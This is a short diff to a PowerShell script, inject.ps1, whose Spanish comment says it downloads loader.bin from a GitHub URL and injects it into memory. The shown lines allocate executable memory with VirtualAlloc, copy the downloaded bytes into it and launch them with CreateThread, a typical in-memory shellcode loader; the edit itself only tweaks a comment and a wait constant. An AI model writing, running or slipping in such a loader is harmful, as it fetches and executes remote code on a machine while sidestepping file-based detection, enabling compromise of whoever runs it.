@@ -1,4 +1,4 @@
-# inject.ps1 - Descarga loader.bin e inyecta en memoria
+# inject.ps1 - Descarga loader.bin e inyecta en memoria (corregido)
 $ErrorActionPreference = 'Stop'
 $binUrl = 'https://github.com/DECODERkING/code/raw/main/loader.bin'
 $binPath = "$env:TEMP\loader.bin"
@@ -18,4 +18,4 @@ $addr  = $k32::VirtualAlloc([IntPtr]::Zero, $size, 0x1000 -bor 0x2000, 0x40)
 [Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length)
 
 $th = $k32::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
-$k32::WaitForSingleObject($th, 0xFFFFFFFF) | Out-Null
+$k32::WaitForSingleObject($th, [UInt32]::MaxValue) | Out-Null
